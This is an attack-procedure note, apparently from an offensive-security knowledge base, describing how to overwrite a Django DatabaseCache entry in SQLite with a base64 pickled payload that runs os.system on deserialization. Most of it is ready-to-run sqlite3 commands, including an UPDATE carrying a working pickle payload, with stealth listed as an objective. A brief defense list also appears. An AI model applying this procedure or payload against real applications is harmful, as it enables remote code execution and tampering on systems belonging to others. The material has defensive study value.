---
tags:
  - rce
  - deserialization
  - payload-injection
type: procedure
tools:
  - '[[tools/sqlite3]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/sqlite3-open-db]]'
  - '[[commands/sqlite3-select-cache]]'
  - '[[commands/sqlite3-update-payload]]'
verified: false
platforms:
  - Web
  - Linux
  - Python
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Python]]'
updated_at: '2025-12-14T17:23:24.674Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: fa40abec-1a9d-4155-b804-c903625471c2
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Python]]'
---
# Inject-Malicious-Payload-into-Cache

## Summary

This procedure injects a malicious pickled payload into Django's DatabaseCache table using SQLite, exploiting pickle's __reduce__ method to execute arbitrary commands like 'whoami' upon deserialization.

## Description

Django's DatabaseCache serializes data with pickle.load(), which can execute code if untrusted data is deserialized. An attacker with database access queries the cache table, identifies a row (e.g., via rowid), and updates the 'value' column with base64-encoded pickled data containing a custom class that triggers os.system. This targets the vulnerability in django.core.cache.backends.db.DatabaseCache, assuming access via file system or SQL injection. Outcome is a tampered cache entry ready for RCE.

## Requirements

1. Access to the Django database file (db.sqlite3)
2. Knowledge of the cache table name (e.g., my_cache_table)
3. Pre-existing cache entry from application usage

## Defense

Defensive measures and detection strategies:

- Use secure serialization like JSON or msgpack instead of pickle
- Implement cache data signing or validation before deserialization
- Audit database logs for unauthorized SELECT/UPDATE on cache tables
- Deploy WAF to block SQL injection attempts on cache access

## Objectives

1. Locate and overwrite a cache entry with RCE payload
2. Ensure payload deserializes to execute commands
3. Maintain stealth by targeting existing entries

## Instructions

### Step 1: Open SQLite Database Shell

**Context**: Access the Django database to interact with the cache table.

Execute [[commands/sqlite3-open-db]]:

```bash
sqlite3 db.sqlite3
```

> Opens the SQLite prompt (sqlite>). Assumes db.sqlite3 is the project database.

### Step 2: Query Cache Table for Target Row

**Context**: Identify a cached entry to overwrite, typically the latest rowid.

Execute [[commands/sqlite3-select-cache]]:

```sql
SELECT * FROM my_cache_table;
```

> Displays rows with cache_key, value (pickled base64), and rowid. Note the target rowid (e.g., 2) for a recent entry.

### Step 3: Update Row with Malicious Payload

**Context**: Inject the pickled payload that deserializes to run os.system('whoami').

Execute [[commands/sqlite3-update-payload]]:

```sql
UPDATE my_cache_table SET value = 'gASVHgAAAAAAAACMAm9zlIwGc3lzdGVtlJOUjAZ3aG9hbWmUhZRSlC4=' WHERE rowid=2;
```

> Updates the 'value' to base64 of a Pwner class using __reduce__. Exit SQLite with .quit. Expected: 1 row affected.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Python]]

### Sub-Techniques


## Commands Used

- [[commands/sqlite3-open-db]]
- [[commands/sqlite3-select-cache]]
- [[commands/sqlite3-update-payload]]

## Tools Used

- [[tools/sqlite3]]

## Tags

- rce
- pickle
- injection
